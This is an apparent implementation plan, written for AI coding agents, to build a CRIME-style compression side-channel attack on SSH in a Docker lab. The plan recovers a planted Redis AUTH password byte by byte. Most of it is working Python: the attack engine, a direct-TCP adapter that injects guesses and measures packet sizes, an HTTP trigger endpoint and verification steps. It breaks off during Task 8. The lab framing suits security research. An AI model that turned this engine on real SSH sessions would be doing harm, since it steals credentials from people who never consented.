# Unified Attack Engine Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Rewrite the three drifted SSH-compression-attack variants (`direct`, `BEAST`, `ansible`) onto a single transport-agnostic engine so optimizations can be toggled independently and compared apples-to-apples across variants via a benchmark harness.

**Architecture:** One engine in `attacker/attack/engine.py` owns the algorithm (round loop, candidate ranking, alignment handling, metrics). Three thin adapters under `attacker/attack/adapters/` own transport-specific ordering (flush / open channel / trigger secret / send guess / measure) and expose a single `measure_once(prefix, candidate, alignment) -> int` coroutine to the engine. `mitm.py` exposes one `/run_attack` endpoint that dispatches on `variant`. `benchmark.py` gains `--scenario` / `--fixed-nl` / `--config` flags and per-position aggregation.

**Tech Stack:** Python 3.14, asyncio, aiohttp, scapy (attacker only), redis.asyncio (client only), Docker Compose. No pytest — lightweight assertion scripts for engine-logic sanity checks; `scripts/verify_*.py` are the correctness gate.

**Spec:** `docs/superpowers/specs/2026-04-22-unified-attack-design.md`

---

## Terminology reminder (normative; apply to all new identifiers)

| Old | New |
|---|---|
| noise / noise_lengths / noise_mode | alignment data / `alignment_lengths` / `alignment_mode` |
| `_NOISE_POOL` / `_make_noise` | `_ALIGNMENT_POOL` / `_make_alignment` |
| `adaptive_noise` | `adaptive_alignment` |
| `noise_hints` (ansible per-position) | removed — replaced by `alignment_hint_carryover` (auto-derived) |

---

## Phase 0 — Infrastructure scaffold

### Task 1: Create the `attacker/attack/` package skeleton

**Files:**
- Create: `attacker/attack/__init__.py`
- Create: `attacker/attack/config.py`
- Create: `attacker/attack/alignment.py`
- Create: `attacker/attack/engine.py`
- Create: `attacker/attack/adapters/__init__.py`
- Create: `attacker/attack/adapters/base.py`
- Create: `attacker/attack/adapters/direct.py`
- Create: `attacker/attack/adapters/beast.py`
- Create: `attacker/attack/adapters/ansible.py`
- Create: `attacker/attack/tests/__init__.py`

- [ ] **Step 1: Create every file listed above with a one-line module docstring and nothing else.**

Example (`attacker/attack/__init__.py`):

```python
"""Unified attack engine for the CRIME-on-SSH PoC. See attacker/attack/engine.py."""
```

Example (`attacker/attack/adapters/base.py`):

```python
"""Adapter protocol shared by direct, BEAST, and ansible transports."""
```

Every file's docstring is one line. Do not add any code yet.

- [ ] **Step 2: Verify the package imports**

Run: `python -c "import attacker.attack; import attacker.attack.adapters; print('ok')"` from repo root.

Expected output: `ok`

- [ ] **Step 3: Commit**

```bash
git add attacker/attack/
git commit -m "feat: Scaffold unified attack engine package"
```

---

### Task 2: Implement `alignment.py`

**Files:**
- Modify: `attacker/attack/alignment.py`
- Create: `attacker/attack/tests/test_alignment.py`

- [ ] **Step 1: Write the assertion-style test**

```python
"""Sanity checks for alignment.py. Run: python -m attacker.attack.tests.test_alignment"""
from attacker.attack.alignment import _ALIGNMENT_POOL, make_alignment


def test_pool_size_and_range():
    # 8-bit DEFLATE literals in the 0x80..0x8F range.
    assert list(_ALIGNMENT_POOL) == list(range(0x80, 0x90))


def test_make_alignment_basic():
    assert make_alignment(0) == b""
    assert make_alignment(1) == bytes([0x80])
    assert make_alignment(3) == bytes([0x80, 0x81, 0x82])
    assert make_alignment(8) == bytes(range(0x80, 0x88))


def test_make_alignment_rejects_too_long():
    try:
        make_alignment(17)
    except ValueError:
        return
    raise AssertionError("expected ValueError for length > pool size")


if __name__ == "__main__":
    test_pool_size_and_range()
    test_make_alignment_basic()
    test_make_alignment_rejects_too_long()
    print("alignment tests: ok")
```

- [ ] **Step 2: Run the test, see it fail**

Run: `python -m attacker.attack.tests.test_alignment`

Expected: ImportError for `make_alignment` (module is empty except docstring).

- [ ] **Step 3: Implement `alignment.py`**

```python
"""8-bit DEFLATE literals used as alignment-data bytes.

The pool is 0x80..0x8F — all 8-bit fixed-Huffman literals (DEFLATE codes
0..143 are 8 bits), mutually distinct so no intra-alignment LZ77 matches,
and absent from plausible dictionary content (ASCII text, zeros, SSH
framing). Do not substitute arbitrary bytes here.
"""

_ALIGNMENT_POOL = list(range(0x80, 0x90))


def make_alignment(length: int) -> bytes:
    if length > len(_ALIGNMENT_POOL):
        raise ValueError(
            f"alignment length {length} > pool size {len(_ALIGNMENT_POOL)}"
        )
    return bytes(_ALIGNMENT_POOL[:length])
```

- [ ] **Step 4: Run the test, see it pass**

Run: `python -m attacker.attack.tests.test_alignment`

Expected: `alignment tests: ok`

- [ ] **Step 5: Commit**

```bash
git add attacker/attack/alignment.py attacker/attack/tests/test_alignment.py
git commit -m "feat: Alignment-data pool and builder"
```

---

### Task 3: Implement `config.py`

**Files:**
- Modify: `attacker/attack/config.py`
- Create: `attacker/attack/tests/test_config.py`

- [ ] **Step 1: Write the assertion-style test**

```python
"""Sanity checks for config.py. Run: python -m attacker.attack.tests.test_config"""
from attacker.attack.config import AttackConfig, AlignmentMode


def _base_kwargs() -> dict:
    return dict(
        known_prefix=b"*3\r\n$",
        alphabet=[bytes([c]) for c in b"abc"],
        max_length=4,
        terminator=b"\n",
        min_margin=16,
        max_rounds=64,
        settle=0.003,
        alignment_mode=AlignmentMode.FULL_SWEEP,
        alignment_lengths=[0, 1, 2, 3, 4, 5, 6, 7],
        candidate_elimination=True,
        constant_prefix_trim=True,
        adaptive_alignment=True,
        stall_detection=True,
        alignment_hint_carryover=True,
        outlier_threshold=0,
        flush_bytes=33000,
        flush_pool="secrets_random",
        measurement_min_segment_size=0,
    )


def test_construct_defaults():
    cfg = AttackConfig(**_base_kwargs())
    assert cfg.alignment_mode == AlignmentMode.FULL_SWEEP
    assert cfg.label == ""


def test_from_dict_partial_override():
    base = AttackConfig(**_base_kwargs())
    overridden = base.overlay({
        "min_margin": 32,
        "candidate_elimination": False,
        "alignment_mode": "fixed_single",
        "alignment_lengths": [3],
    })
    assert overridden.min_margin == 32
    assert overridden.candidate_elimination is False
    assert overridden.alignment_mode == AlignmentMode.FIXED_SINGLE
    assert overridden.alignment_lengths == [3]
    # Unmentioned fields are preserved.
    assert overridden.max_rounds == base.max_rounds
    assert overridden.flush_bytes == base.flush_bytes


def test_overlay_handles_bytes_fields_as_str():
    base = AttackConfig(**_base_kwargs())
    # HTTP bodies will carry strings; overlay decodes them to bytes.
    overridden = base.overlay({
        "known_prefix": "AUTH ",
        "terminator": "\r",
        "alphabet": "xyz",
    })
    assert overridden.known_prefix == b"AUTH "
    assert overridden.terminator == b"\r"
    assert overridden.alphabet == [b"x", b"y", b"z"]


if __name__ == "__main__":
    test_construct_defaults()
    test_from_dict_partial_override()
    test_overlay_handles_bytes_fields_as_str()
    print("config tests: ok")
```

- [ ] **Step 2: Run the test, see it fail**

Run: `python -m attacker.attack.tests.test_config`

Expected: ImportError for `AttackConfig`.

- [ ] **Step 3: Implement `config.py`**

```python
"""AttackConfig + AlignmentMode.

The HTTP handler builds a final config by starting from an adapter's
default_config() and calling overlay() with the caller-supplied override
dict. Bytes fields (known_prefix, terminator, alphabet) arrive as strings
over JSON and are decoded here, centralising the marshalling.
"""

from __future__ import annotations

from dataclasses import dataclass, field, replace
from enum import Enum
from typing import Any, Literal


class AlignmentMode(str, Enum):
    FULL_SWEEP = "full_sweep"
    FIXED_SINGLE = "fixed_single"


@dataclass
class AttackConfig:
    known_prefix: bytes
    alphabet: list[bytes]
    max_length: int
    terminator: bytes

    min_margin: int
    max_rounds: int
    settle: float

    alignment_mode: AlignmentMode
    alignment_lengths: list[int]

    candidate_elimination: bool
    constant_prefix_trim: bool
    adaptive_alignment: bool
    stall_detection: bool
    alignment_hint_carryover: bool

    outlier_threshold: int

    flush_bytes: int
    flush_pool: Literal["secrets_random", "high_ascii", "none"]
    measurement_min_segment_size: int

    label: str = ""

    def overlay(self, overrides: dict[str, Any]) -> "AttackConfig":
        """Return a new config with `overrides` applied; bytes fields decoded."""
        converted: dict[str, Any] = {}
        for key, value in overrides.items():
            if value is None:
                continue
            if key in ("known_prefix", "terminator"):
                converted[key] = value.encode("utf-8") if isinstance(value, str) else bytes(value)
            elif key == "alphabet":
                if isinstance(value, str):
                    converted[key] = [bytes([c]) for c in value.encode("utf-8")]
                else:
                    converted[key] = [bytes([c]) if isinstance(c, int) else bytes(c) for c in value]
            elif key == "alignment_mode":
                converted[key] = AlignmentMode(value) if isinstance(value, str) else value
            else:
                converted[key] = value
        return replace(self, **converted)
```

- [ ] **Step 4: Run the test, see it pass**

Run: `python -m attacker.attack.tests.test_config`

Expected: `config tests: ok`

- [ ] **Step 5: Commit**

```bash
git add attacker/attack/config.py attacker/attack/tests/test_config.py
git commit -m "feat: AttackConfig dataclass and overlay semantics"
```

---

### Task 4: Implement the adapter protocol in `adapters/base.py`

**Files:**
- Modify: `attacker/attack/adapters/base.py`

- [ ] **Step 1: Write the protocol module**

```python
"""Adapter protocol shared by direct, BEAST, and ansible transports.

The engine asks the adapter for one thing only: given a prefix, candidate,
and alignment bytes, return the measured c->s byte count for one oracle
query. Transport-specific ordering (flush / open measure channel / trigger
secret / send guess / read packet log) lives inside the adapter.
"""

from __future__ import annotations

from typing import Protocol, runtime_checkable

import aiohttp

from attacker.attack.config import AttackConfig


@runtime_checkable
class Adapter(Protocol):
    async def setup(self, config: AttackConfig, http_session: aiohttp.ClientSession) -> None:
        """Called once before the first measure_once."""

    async def teardown(self) -> None:
        """Called once after the last measure_once (always, even on error)."""

    async def measure_once(
        self,
        prefix: bytes,
        candidate: bytes,
        alignment: bytes,
    ) -> int:
        """Inject `prefix + candidate + alignment` and return observed c->s bytes."""

    @classmethod
    def default_config(cls) -> AttackConfig:
        """Variant-tuned config; scenario presets override toggle fields on top."""
```

- [ ] **Step 2: Verify it imports**

Run: `python -c "from attacker.attack.adapters.base import Adapter; print(Adapter)"`

Expected: A class reference printed (not an error).

- [ ] **Step 3: Commit**

```bash
git add attacker/attack/adapters/base.py
git commit -m "feat: Adapter protocol"
```

---

## Phase 1 — Engine + direct adapter end-to-end slice

### Task 5: Implement `engine.py`

**Files:**
- Modify: `attacker/attack/engine.py`
- Create: `attacker/attack/tests/test_engine_helpers.py`

- [ ] **Step 1: Write tests for the pure-logic helpers**

```python
"""Sanity checks for engine helpers. Run: python -m attacker.attack.tests.test_engine_helpers"""
from attacker.attack.engine import (
    _pick_alignment_with_largest_gap,
    _select_initial_alignment,
)
from attacker.attack.config import AttackConfig, AlignmentMode
from attacker.attack.tests.test_config import _base_kwargs


def _cfg(**overrides) -> AttackConfig:
    k = _base_kwargs()
    k.update(overrides)
    return AttackConfig(**k)


def test_pick_alignment_returns_nl_with_largest_gap():
    # At nl=3 the best candidate is 8 wire bytes cheaper than every other.
    per_nl = {
        0: {b"h": 120, b"a": 120, b"b": 120},
        3: {b"h": 112, b"a": 120, b"b": 120},
        5: {b"h": 120, b"a": 120, b"b": 120},
    }
    assert _pick_alignment_with_largest_gap(per_nl, best=b"h") == 3


def test_pick_alignment_returns_none_when_no_gap():
    per_nl = {
        0: {b"h": 120, b"a": 120, b"b": 120},
        3: {b"h": 120, b"a": 120, b"b": 120},
    }
    assert _pick_alignment_with_largest_gap(per_nl, best=b"h") is None


def test_pick_alignment_returns_none_when_only_one_candidate():
    # Single-candidate rounds have no "others" to compare against.
    per_nl = {0: {b"h": 120}, 3: {b"h": 112}}
    assert _pick_alignment_with_largest_gap(per_nl, best=b"h") is None


def test_select_initial_alignment_fixed_single():
    cfg = _cfg(alignment_mode=AlignmentMode.FIXED_SINGLE, alignment_lengths=[3])
    assert _select_initial_alignment(cfg, prev_nl=None) == [3]
    assert _select_initial_alignment(cfg, prev_nl=5) == [3]  # hint ignored in fixed mode


def test_select_initial_alignment_full_sweep_no_hint():
    cfg = _cfg(alignment_hint_carryover=False)
    assert _select_initial_alignment(cfg, prev_nl=None) == list(range(8))
    assert _select_initial_alignment(cfg, prev_nl=3) == list(range(8))  # carryover off


def test_select_initial_alignment_full_sweep_with_hint():
    cfg = _cfg(alignment_hint_carryover=True)
    assert _select_initial_alignment(cfg, prev_nl=None) == list(range(8))  # no hint yet
    assert _select_initial_alignment(cfg, prev_nl=3) == [3]


if __name__ == "__main__":
    test_pick_alignment_returns_nl_with_largest_gap()
    test_pick_alignment_returns_none_when_no_gap()
    test_pick_alignment_returns_none_when_only_one_candidate()
    test_select_initial_alignment_fixed_single()
    test_select_initial_alignment_full_sweep_no_hint()
    test_select_initial_alignment_full_sweep_with_hint()
    print("engine-helper tests: ok")
```

- [ ] **Step 2: Run the test, see it fail**

Run: `python -m attacker.attack.tests.test_engine_helpers`

Expected: ImportError for the helpers.

- [ ] **Step 3: Implement `engine.py`**

Full file — this is the one place the algorithm lives:

```python
"""Transport-agnostic engine: round loop, candidate ranking, metrics.

The engine calls adapter.measure_once(prefix, candidate, alignment) for
every oracle query. Everything else — noise-free naming has been applied
(alignment data vs protocol noise) — lives here.
"""

from __future__ import annotations

import logging
import time
from typing import Any

import aiohttp

from attacker.attack.adapters.base import Adapter
from attacker.attack.alignment import make_alignment
from attacker.attack.config import AttackConfig, AlignmentMode

LOG = logging.getLogger("attack.engine")


# ---------------------------------------------------------------------------
# Pure-logic helpers (unit-tested)
# ---------------------------------------------------------------------------

def _pick_alignment_with_largest_gap(
    per_nl: dict[int, dict[bytes, int]],
    best: bytes,
) -> int | None:
    """Return the alignment length at which `best` beats every other
    candidate by the most wire bytes, or None if no alignment shows any
    gap (e.g., single-candidate round, or all measurements identical).
    """
    sig_nl: int | None = None
    best_gap = 0
    for nl, vals in per_nl.items():
        if best not in vals:
            continue
        others = [v for c, v in vals.items() if c != best]
        if not others:
            continue
        gap = min(others) - vals[best]
        if gap > best_gap:
            best_gap = gap
            sig_nl = nl
    return sig_nl


def _select_initial_alignment(
    config: AttackConfig,
    prev_nl: int | None,
) -> list[int]:
    if config.alignment_mode == AlignmentMode.FIXED_SINGLE:
        return [config.alignment_lengths[0]]
    if config.alignment_hint_carryover and prev_nl is not None:
        if prev_nl in config.alignment_lengths:
            return [prev_nl]
    return list(config.alignment_lengths)


# ---------------------------------------------------------------------------
# Per-position recovery
# ---------------------------------------------------------------------------

async def crack_byte_position(
    adapter: Adapter,
    config: AttackConfig,
    prefix: bytes,
    initial_alignment: list[int],
    log_prefix: str,
) -> tuple[bytes, dict[str, Any]]:
    sums: dict[bytes, int] = {c: 0 for c in config.alphabet}
    active_candidates = list(config.alphabet)
    active_alignment = list(initial_alignment)
    guesses = 0
    prev_margin = 0
    stall_count = 0

    # Chacha20's padding modulus, recovered from the configured set.
    # Matches the original code's `noise_lengths[-1] + 1`.
    n = max(config.alignment_lengths) + 1

    per_nl: dict[int, dict[bytes, int]] = {}
    best: bytes = active_candidates[0]
    margin = 0
    rnd = 0

    for rnd in range(1, config.max_rounds + 1):
        # One round with outlier-retry. If outlier_threshold == 0 we take
        # the first pass unconditionally.
        while True:
            per_nl = {nl: {} for nl in active_alignment}
            for nl in active_alignment:
                alignment = make_alignment(nl)
                for c in active_candidates:
                    guesses += 1
                    per_nl[nl][c] = await adapter.measure_once(prefix, c, alignment)
            flat = [v for m in per_nl.values() for v in m.values()]
            if (
                config.outlier_threshold == 0
                or not flat
                or max(flat) - min(flat) <= config.outlier_threshold
            ):
                break
            LOG.info(
                "%s round=%d outlier min=%d max=%d (threshold=%d), retry",
                log_prefix, rnd, min(flat), max(flat), config.outlier_threshold,
            )

        for c in active_candidates:
            sums[c] += sum(per_nl[nl][c] for nl in active_alignment)
        ranked = sorted(active_candidates, key=lambda c: sums[c])
        best = ranked[0]
        second_sum = sums[ranked[1]] if len(ranked) > 1 else sums[best]
        margin = second_sum - sums[best]
        eliminated = 0

        if config.candidate_elimination:
            before = len(active_candidates)
            active_candidates = [
                c for c in ranked if sums[c] - sums[best] < config.min_margin
            ]
            if len(active_candidates) < 2:
                active_candidates = ranked[:2]
            eliminated = before - len(active_candidates)

        if config.adaptive_alignment and rnd == 1:
            productive = {
                nl for nl, m in per_nl.items() if min(m.values()) < max(m.values())
            }
            if productive:
                keep: set[int] = set()
                for nl in productive:
                    keep.add(nl)
                    keep.add((nl - 1) % n)
                    keep.add((nl + 1) % n)
                new_alignment = sorted(keep & set(config.alignment_lengths))
                if len(new_alignment) >= 3:
                    active_alignment = new_alignment

        if config.stall_detection:
            if margin <= prev_margin and eliminated == 0:
                stall_count += 1
            else:
                stall_count = 0
            prev_margin = margin
            if stall_count >= 2 and len(active_alignment) < len(config.alignment_lengths):
                expanded = set(active_alignment)
                for nl in list(expanded):
                    expanded.add((nl - 1) % n)
                    expanded.add((nl + 1) % n)
                active_alignment = sorted(expanded & set(config.alignment_lengths))
                stall_count = 0
                LOG.info("%s round=%d stall, expanding alignment", log_prefix, rnd)

        LOG.info(
            "%s round=%d best=%r sum=%d 2nd=%d margin=%d alive=%d align=%d",
            log_prefix, rnd, best.decode("latin-1"), sums[best],
            second_sum, margin, len(active_candidates), len(active_alignment),
        )
        if margin >= config.min_margin:
            break
    else:
        LOG.warning(
            "%s exhausted %d rounds, margin=%d (threshold=%d)",
            log_prefix, config.max_rounds, margin, config.min_margin,
        )

    successful_alignment = _pick_alignment_with_largest_gap(per_nl, best)
    ranked_all = sorted(config.alphabet, key=lambda c: sums[c])
    return best, {
        "position": log_prefix,
        "best": best.decode("latin-1"),
        "guesses": guesses,
        "rounds": rnd,
        "final_margin": margin,
        "successful_alignment": successful_alignment,
        "ranked_top5": [
            (c.decode("latin-1"), sums[c]) for c in ranked_all[:5]
        ],
    }


# ---------------------------------------------------------------------------
# Full attack
# ---------------------------------------------------------------------------

async def run_attack(
    adapter: Adapter,
    config: AttackConfig,
) -> dict[str, Any]:
    LOG.info(
        "run_attack: variant=%s label=%r prefix=%r alphabet=%d max_len=%d "
        "mode=%s lengths=%s min_margin=%d max_rounds=%d",
        adapter.__class__.__name__, config.label,
        config.known_prefix, len(config.alphabet), config.max_length,
        config.alignment_mode.value, config.alignment_lengths,
        config.min_margin, config.max_rounds,
    )
    started = time.time()

    timeout = aiohttp.ClientTimeout(total=7200)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        await adapter.setup(config, session)
        try:
            recovered = b""
            per_position: list[dict[str, Any]] = []
            prev_nl: int | None = None

            for pos in range(config.max_length):
                full_prefix = config.known_prefix + recovered
                if config.constant_prefix_trim:
                    trim = max(0, len(full_prefix) - len(config.known_prefix))
                    full_prefix = full_prefix[trim:]

                initial_alignment = _select_initial_alignment(config, prev_nl)
                best, pos_info = await crack_byte_position(
                    adapter=adapter,
                    config=config,
                    prefix=full_prefix,
                    initial_alignment=initial_alignment,
                    log_prefix=f"pos {pos:2d}",
                )
                pos_info["position"] = pos
                per_position.append(pos_info)
                prev_nl = pos_info["successful_alignment"]

                if best == config.terminator:
                    LOG.info("hit terminator at position %d -> done", pos)
                    break
                recovered += best
                LOG.info("recovered so far: %r", recovered.decode("latin-1"))
            else:
                LOG.warning("hit max_length=%d without terminator", config.max_length)
        finally:
            await adapter.teardown()

    elapsed = time.time() - started
    LOG.info("run_attack done in %.1fs: recovered=%r",
             elapsed, recovered.decode("latin-1"))
    return {
        "recovered": recovered.decode("latin-1"),
        "elapsed_seconds": elapsed,
        "total_guesses": sum(p["guesses"] for p in per_position),
        "per_position": per_position,
        "config_label": config.label,
    }
```

- [ ] **Step 4: Run the helpers test, see it pass**

Run: `python -m attacker.attack.tests.test_engine_helpers`

Expected: `engine-helper tests: ok`

- [ ] **Step 5: Commit**

```bash
git add attacker/attack/engine.py attacker/attack/tests/test_engine_helpers.py
git commit -m "feat: Transport-agnostic attack engine"
```

---

### Task 6: Port direct-TCP adapter

**Files:**
- Modify: `attacker/attack/adapters/direct.py`

Refer to `attacker/attack.py:55-170` (old `_c2s_total`, `_open_tunnel`, `_sweep_round`) for the current behaviour. The adapter condenses it into a `measure_once` that preserves the current ordering.

- [ ] **Step 1: Write the adapter**

```python
"""Direct-TCP adapter.

Ordering per oracle query (preserved from attacker/attack.py):
  1. Flush — throwaway connection, `flush_bytes` random bytes.
  2. Open the measure tunnel — CHANNEL_OPEN enters the compressor
     before the secret.
  3. Settle so CHANNEL_OPEN reaches the sniffer.
  4. Trigger Redis AUTH — secret enters compressor right before the guess.
  5. Settle.
  6. Clear packet log.
  7. Write guess on the measure tunnel.
  8. Settle.
  9. Read packet log.
"""

from __future__ import annotations

import asyncio
import os
import random
import secrets
from typing import Any

import aiohttp

from attacker.attack.config import AttackConfig, AlignmentMode

CLIENT_BASE = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
TUNNEL_PORT = int(os.environ.get("TUNNEL_PORT", "6379"))
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))


class DirectAdapter:
    def __init__(self, packet_log: Any) -> None:
        self._packet_log = packet_log
        self._config: AttackConfig | None = None
        self._session: aiohttp.ClientSession | None = None

    async def setup(self, config: AttackConfig, http_session: aiohttp.ClientSession) -> None:
        self._config = config
        self._session = http_session

    async def teardown(self) -> None:
        self._config = None
        self._session = None

    async def measure_once(
        self, prefix: bytes, candidate: bytes, alignment: bytes,
    ) -> int:
        cfg = self._config
        assert cfg is not None and self._session is not None

        # 1. Flush (throwaway connection)
        if cfg.flush_bytes > 0:
            flush_data = _flush_payload(cfg)
            try:
                _, fw = await _open_tunnel()
                fw.write(flush_data)
                await fw.drain()
            except (ConnectionResetError, BrokenPipeError, OSError):
                pass
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 2-3. Open measure tunnel, let CHANNEL_OPEN settle
        _, mw = await _open_tunnel()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 4-5. Refresh secret
        async with self._session.post(f"{CLIENT_BASE}/send_secret") as r:
            await r.read()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 6-9. Clear, guess, settle, read
        self._packet_log.clear()
        mw.write(prefix + candidate + alignment)
        await mw.drain()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)
        measured = _sum_c2s(
            self._packet_log.snapshot(), cfg.measurement_min_segment_size,
        )

        try:
            mw.close()
        except Exception:  # noqa: BLE001
            pass

        return measured

    @classmethod
    def default_config(cls) -> AttackConfig:
        return AttackConfig(
            known_prefix=b"*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
            alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
            max_length=32,
            terminator=b"\r",
            min_margin=16,
            max_rounds=64,
            settle=0.003,
            alignment_mode=AlignmentMode.FULL_SWEEP,
            alignment_lengths=[0, 1, 2, 3, 4, 5, 6, 7],
            candidate_elimination=True,
            constant_prefix_trim=True,
            adaptive_alignment=True,
            stall_detection=True,
            alignment_hint_carryover=True,
            outlier_threshold=0,
            flush_bytes=33000,
            flush_pool="secrets_random",
            measurement_min_segment_size=0,
            label="direct-default",
        )


# ---------------------------------------------------------------------------
# Module helpers
# ---------------------------------------------------------------------------

async def _open_tunnel(retries: int = 20, delay: float = 1.0) -> tuple:
    for attempt in range(1, retries + 1):
        try:
            return await asyncio.open_connection(CLIENT_HOST, TUNNEL_PORT)
        except (OSError, ConnectionRefusedError):
            if attempt >= retries:
                raise
            await asyncio.sleep(delay)
    raise RuntimeError("unreachable")


def _flush_payload(cfg: AttackConfig) -> bytes:
    if cfg.flush_pool == "secrets_random":
        return secrets.token_bytes(cfg.flush_bytes)
    if cfg.flush_pool == "high_ascii":
        return bytes(random.choices(range(0x80, 0x100), k=cfg.flush_bytes))
    raise ValueError(f"unexpected flush_pool {cfg.flush_pool!r}")


def _sum_c2s(records: list[dict], min_segment_size: int) -> int:
    return sum(
        r["tcp_payload_len"] for r in records
        if r["dport"] == LISTEN_PORT and r["tcp_payload_len"] > min_segment_size
    )
```

- [ ] **Step 2: Verify it imports and the default_config is valid**

Run:
```bash
python -c "
from attacker.attack.adapters.direct import DirectAdapter
cfg = DirectAdapter.default_config()
print(cfg.label, cfg.min_margin, cfg.flush_pool)
"
```

Expected: `direct-default 16 secrets_random`

- [ ] **Step 3: Commit**

```bash
git add attacker/attack/adapters/direct.py
git commit -m "feat: Direct-TCP adapter for unified attack engine"
```

---

### Task 7: Wire the new `/run_attack` endpoint into `mitm.py` (keep old endpoints as shims)

**Files:**
- Modify: `attacker/mitm.py:38-40` (imports)
- Modify: `attacker/mitm.py:466-477` (route registration)
- Add a new `handle_run_attack_v2` function

- [ ] **Step 1: Replace the variant-specific imports with the new engine import**

In `attacker/mitm.py` lines 38-40, replace:

```python
from attack import run_attack as run_crime_attack
from attack_ansible import run_attack as run_ansible_attack
from attack_beast import BrowserBridge, run_attack as run_beast_attack
```

with:

```python
# Old per-variant modules kept temporarily for the shim endpoints.
from attack import run_attack as run_crime_attack
from attack_ansible import run_attack as run_ansible_attack
from attack_beast import BrowserBridge, run_attack as run_beast_attack

# New unified engine.
from attacker.attack.engine import run_attack as run_unified_attack
from attacker.attack.adapters.direct import DirectAdapter
```

- [ ] **Step 2: Add the new handler after `handle_run_attack_beast`**

Add before `# --------------------------------------------------------------------------\n# main`:

```python
async def handle_run_attack_v2(request: web.Request) -> web.Response:
    """Unified attack endpoint: /run_attack with {"variant": ..., "config": {...}}."""
    body: dict[str, Any] = {}
    if request.body_exists:
        try:
            body = await request.json()
        except Exception:  # noqa: BLE001
            body = {}
    variant = body.get("variant", "direct")
    overrides = body.get("config", {}) or {}

    adapter_cls = _ADAPTER_BY_VARIANT.get(variant)
    if adapter_cls is None:
        return web.json_response(
            {"ok": False, "error": f"unknown variant {variant!r}"}, status=400,
        )
    if variant == "beast" and not BROWSER_BRIDGE.connected:
        return web.json_response(
            {"ok": False, "error": "browser not connected"}, status=503,
        )

    config = adapter_cls.default_config().overlay(overrides)
    adapter = _build_adapter(adapter_cls, variant)

    LOG.info("HTTP /run_attack_v2: variant=%s label=%r", variant, config.label)
    try:
        result = await run_unified_attack(adapter=adapter, config=config)
    except Exception as exc:  # noqa: BLE001
        LOG.exception("unified attack failed")
        return web.json_response(
            {"ok": False, "error": str(exc), "variant": variant}, status=500,
        )
    LOG.info("unified attack done: recovered=%r", result["recovered"])
    return web.json_response({"ok": True, "variant": variant, **result})


# Populated below as adapters are landed. BEAST / Ansible slots are filled
# in later tasks; until then, only "direct" is accepted.
_ADAPTER_BY_VARIANT: dict[str, Any] = {
    "direct": DirectAdapter,
}


def _build_adapter(adapter_cls: Any, variant: str) -> Any:
    if variant == "direct":
        return adapter_cls(packet_log=PACKET_LOG)
    # BEAST / Ansible handled when their adapters land.
    raise NotImplementedError(f"adapter construction not wired for variant {variant!r}")
```

- [ ] **Step 3: Register the new route**

In `attacker/mitm.py` around line 477 (inside the route setup block), add:

```python
    # New unified endpoint; old per-variant endpoints remain as shims
    # until scripts/benchmark.py switch over.
    app.router.add_post("/run_attack_v2", handle_run_attack_v2)
```

- [ ] **Step 4: Rebuild and smoke-test the attacker container**

```bash
docker compose up -d --build attacker
docker compose logs --tail 50 attacker
```

Expected: the attacker starts without import errors. Look for the `HTTP control API listening on 0.0.0.0:9000` line.

- [ ] **Step 5: Smoke-test the new endpoint with `curl` (one byte only, no planted secret change)**

```bash
curl -sS -X POST http://127.0.0.1:9000/run_attack_v2 \
  -H 'Content-Type: application/json' \
  -d '{"variant":"direct","config":{"max_length":1,"label":"smoke"}}' | head -c 400
echo
```

Expected: a JSON response with `"ok": true`, `"variant": "direct"`, a `recovered` string (may not match the secret — it's a one-byte smoke), and a non-zero `total_guesses`.

- [ ] **Step 6: Commit**

```bash
git add attacker/mitm.py
git commit -m "feat: Unified /run_attack_v2 endpoint with direct adapter wired"
```

---

### Task 8: Rename `scripts/verify.py` → `scripts/verify_direct.py` and rewire it to `/run_attack_v2`

**Files:**
- Create (via rename): `scripts/verify_direct.py`
- Delete: `scripts/verify.py`

- [ ] **Step 1: Rename the file**

```bash
git mv scripts/verify.py scripts/verify_direct.py
```

- [ ] **Step 2: Rewire the file's docstring and attack call**

In `scripts/verify_direct.py`, keep the existing preconditions checks (steps 1–5). Add a step 6 that runs the direct attack two-phase recovery of `hunter2` through `/run_attack_v2`. Replace nothing in steps 1-5; append:

```python
def beast_attack_not_applicable():
    """Stub; verify_direct targets the direct variant only."""


def _run_attack_v2(variant: str, known_prefix: str, alphabet: str,
                   max_length: int) -> dict:
    body = json.dumps({
        "variant": variant,
        "config": {
            "known_prefix": known_prefix,
            "alphabet": alphabet,
            "max_length": max_length,
        },
    }).encode("utf-8")
    req = urllib.request.Request(
        f"{ATTACKER_BASE}/run_attack_v2",
        method="POST",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=3600) as resp:
        return json.loads(resp.read())
```

Then add this as a new step inside `main()`, immediately before `return 0`:

```python
    step("6. Direct variant: recover hunter2 through /run_attack_v2")
    http("POST", f"{CLIENT_BASE}/set_secret",
         body=json.dumps({"value": "hunter2"}).encode("utf-8"))
    time.sleep(2.0)

    RESP_PREFIX = "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$"
    t0 = time.time()
    r1 = _run_attack_v2("direct", RESP_PREFIX, "0123456789", 4)
    if not r1.get("ok"):
        fail(f"phase 1 failed: {r1}")
    pw_len = r1["recovered"]
    print(f"  phase 1: length = {pw_len} ({r1['elapsed_seconds']:.1f}s, "
          f"{r1['total_guesses']} guesses)")

    r2 = _run_attack_v2(
        "direct", RESP_PREFIX + pw_len + "\r\n",
        "abcdefghijklmnopqrstuvwxyz0123456789", int(pw_len) + 4,
    )
    if not r2.get("ok"):
        fail(f"phase 2 failed: {r2}")
    password = r2["recovered"].rstrip("\r")
    elapsed = time.time() - t0
    print(f"  phase 2: password = {password!r} "
          f"({r2['elapsed_seconds']:.1f}s, {r2['total_guesses']} guesses)")
